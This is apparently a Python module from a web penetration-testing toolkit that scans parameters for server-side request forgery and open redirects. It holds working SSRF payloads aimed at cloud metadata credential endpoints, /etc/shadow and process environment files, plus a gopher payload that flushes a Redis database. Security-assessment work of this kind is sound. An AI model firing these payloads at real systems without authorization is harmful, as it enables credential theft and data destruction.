#!/usr/bin/env python3
"""
SSRF Scanner Module
--------------------
Tests for Server-Side Request Forgery in:
  • URL parameters
  • Form inputs
  • Common SSRF-prone endpoints (Advanced payloads from ssrf.txt)
"""

import requests
from bs4 import BeautifulSoup
from pathlib import Path
from urllib.parse import urljoin, urlparse, parse_qs
from typing import List, Dict, Optional
from rich.console import Console
from rich.progress import Progress, SpinnerColumn, TextColumn, BarColumn

console = Console()

# ── Load SSRF targets from payload file ──────────────────────────────────────
_SSRF_PAYLOAD_FILE = Path(__file__).parents[2] / "wordlists" / "payloads" / "ssrf.txt"


def _load_ssrf_targets() -> List[str]:
    """Load SSRF URLs from wordlist file, skip comments and blank lines."""
    if _SSRF_PAYLOAD_FILE.exists():
        with open(_SSRF_PAYLOAD_FILE, encoding="utf-8") as f:
            lines = [
                l.strip() for l in f if l.strip() and not l.strip().startswith("#")
            ]
        if lines:
            return lines
    return []  # fallback: empty (hardcoded list below used if file missing)


# Internal/cloud metadata endpoints — fallback if ssrf.txt is missing
_SSRF_TARGETS_FALLBACK = [
    "http://169.254.169.254/latest/meta-data/",
    "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
    "http://169.254.169.254/computeMetadata/v1/",
    "http://169.254.169.254/metadata/instance",
    "http://metadata.google.internal/computeMetadata/v1/",
    "http://localhost/",
    "http://127.0.0.1/",
    "http://127.0.0.1:8080/",
    "http://0.0.0.0/",
    "http://[::1]/",
    "http://localhost:6379/",
    "http://localhost:27017/",
    "http://localhost:9200/",
    "http://localhost:2375/containers/json",
    "http://kubernetes.default/",
    "dict://localhost:6379/info",
    "gopher://localhost:6379/_*1%0d%0a$8%0d%0aflushall%0d%0a",
    "file:///etc/passwd",
    "file:///etc/shadow",
    "file:///etc/hosts",
    "file:///proc/self/environ",
    "file:///C:/Windows/win.ini",
]

# Load advanced targets from ssrf.txt (merged with fallback)
SSRF_TARGETS = list(dict.fromkeys(_load_ssrf_targets() or _SSRF_TARGETS_FALLBACK))

# URL params commonly vulnerable to SSRF
SSRF_PARAMS = [
    "url",
    "uri",
    "link",
    "href",
    "src",
    "source",
    "dest",
    "destination",
    "redirect",
    "return",
    "next",
    "proxy",
    "fetch",
    "load",
    "request",
    "path",
    "target",
    "remote",
    "callback",
    "api",
    "endpoint",
    "imageUrl",
    "image_url",
    "fileUrl",
    "file_url",
    "downloadUrl",
]

# Response indicators suggesting internal resource access
SSRF_INDICATORS = [
    # AWS metadata
    "ami-id",
    "instance-id",
    "local-ipv4",
    "public-keys",
    # GCP metadata
    "computeMetadata",
    "instance/zone",
    # Generic internal
    "root:x:",
    "daemon:x:",  # /etc/passwd
    "127.0.0.1",
    "<title>Apache",
    "Welcome to nginx",
    # Redis
    "+PONG",
    "-NOAUTH",
    # MySQL
    "mysql_native_password",
]


class SSRFScanner:
    """Server-Side Request Forgery scanner."""

    def __init__(self, target: str, timeout: int = 8, session=None):
        self.target = target.rstrip("/")
        self.timeout = timeout
        if session is not None:
            self.session = session
        else:
            self.session = requests.Session()
            self.session.headers["User-Agent"] = (
                "WebPwnToolkit/2.0 (Authorized Security Testing)"
            )
            self.session.verify = False
        self.results: List[Dict] = []

    # ── Gather injectable params ───────────────────────────────────────

    def _collect_params(self) -> List[Dict]:
        """Collect URL params and form fields that might be SSRF sinks."""
        params = []

        # URL query params
        parsed = urlparse(self.target)
        qs = parse_qs(parsed.query)
        for key in qs:
            if any(k in key.lower() for k in SSRF_PARAMS):
                params.append(
                    {
                        "type": "get",
                        "url": self.target,
                        "field": key,
                        "others": {k: v[0] for k, v in qs.items()},
                    }
                )

        # Form fields
        try:
            resp = self.session.get(self.target, timeout=self.timeout, verify=False)
            soup = BeautifulSoup(resp.text, "lxml")
            for form in soup.find_all("form"):
                action = urljoin(self.target, form.get("action", ""))
                method = form.get("method", "get").lower()
                fields = {
                    i.get("name"): i.get("value", "")
                    for i in form.find_all("input")
                    if i.get("name")
                }
                for name in fields:
                    if any(k in name.lower() for k in SSRF_PARAMS):
                        params.append(
                            {
                                "type": method,
                                "url": action or self.target,
                                "field": name,
                                "others": fields,
                            }
                        )
        except Exception:
            pass

        return params

    # ── Test single param + payload ────────────────────────────────────

    def _test_ssrf(self, param: Dict, ssrf_url: str) -> Optional[Dict]:
        test = param["others"].copy()
        test[param["field"]] = ssrf_url

        try:
            if param["type"] == "post":
                resp = self.session.post(
                    param["url"],
                    data=test,
                    timeout=self.timeout,
                    verify=False,
                    allow_redirects=True,
                )
            else:
                resp = self.session.get(
                    param["url"],
                    params=test,
                    timeout=self.timeout,
                    verify=False,
                    allow_redirects=True,
                )

            body = resp.text
            for indicator in SSRF_INDICATORS:
                if indicator.lower() in body.lower():
                    return {
                        "url": param["url"],
                        "parameter": param["field"],
                        "payload": ssrf_url,
                        "type": "Server-Side Request Forgery (SSRF)",
                        "severity": "high",
                        "evidence": f"Response contains '{indicator}'",
                        "detail": (
                            f"Server fetched internal resource '{ssrf_url}' — "
                            f"indicator '{indicator}' found in response"
                        ),
                        "owasp": "A10:2021 – Server-Side Request Forgery",
                        "cvss": 8.6,
                        "remediation": (
                            "Validate and whitelist allowed URL schemes/hosts. "
                            "Block requests to private IP ranges (RFC 1918). "
                            "Disable unused URL-fetching features."
                        ),
                    }
        except Exception:
            pass
        return None

    # ── Redirect-based SSRF ────────────────────────────────────────────

    def _test_open_redirect(self) -> List[Dict]:
        """Test for open redirect that could facilitate SSRF."""
        findings = []
        redirect_params = ["redirect", "return", "next", "url", "to", "goto"]
        parsed = urlparse(self.target)

        for param in redirect_params:
            test_url = f"{self.target}?{param}=http://evil.example.com"
            try:
                resp = requests.get(
                    test_url,
                    timeout=self.timeout,
                    verify=False,
                    allow_redirects=False,
                    headers={"User-Agent": "WebPwnToolkit/1.0"},
                )
                if resp.status_code in (301, 302, 307, 308):
                    location = resp.headers.get("Location", "")
                    if "evil.example.com" in location:
                        findings.append(
                            {
                                "url": test_url,
                                "parameter": param,
                                "type": "Open Redirect",
                                "severity": "medium",
                                "evidence": f"Redirects to: {location}",
                                "detail": f"Open redirect via '{param}' parameter",
                                "owasp": "A01:2021 – Broken Access Control",
                                "cvss": 6.1,
                                "remediation": (
                                    "Validate redirect URLs against a whitelist. "
                                    "Do not use user-controlled data in redirect headers."
                                ),
                            }
                        )
            except Exception:
                pass
        return findings

    # ── Public run ─────────────────────────────────────────────────────

    def run(self) -> List[Dict]:
        params = self._collect_params()
        # Reload at runtime to pick up any ssrf.txt changes
        targets = list(dict.fromkeys(_load_ssrf_targets() or _SSRF_TARGETS_FALLBACK))
        console.print(f"  [dim]-> {len(params)} SSRF-prone parameter(s) found[/dim]")
        console.print(f"  [dim]-> Testing {len(targets)} SSRF targets (advanced)[/dim]")

        total = len(params) * len(targets)

        with Progress(
            SpinnerColumn(),
            TextColumn("[cyan]SSRF scanning...[/cyan]"),
            BarColumn(),
            TextColumn("[progress.percentage]{task.percentage:>3.0f}%"),
            console=console,
        ) as progress:
            task = progress.add_task("ssrf", total=max(total, 1))
            for param in params:
                for ssrf_url in targets:
                    progress.advance(task)
                    result = self._test_ssrf(param, ssrf_url)
                    if result and result not in self.results:
                        self.results.append(result)

        # Also check open redirects
        self.results.extend(self._test_open_redirect())

        console.print(
            f"  [{'red' if self.results else 'green'}]"
            f"{'⚠ ' + str(len(self.results)) + ' SSRF/Redirect issue(s) found!' if self.results else '✅ No SSRF found'}"
            f"[/]"
        )
        return self.results
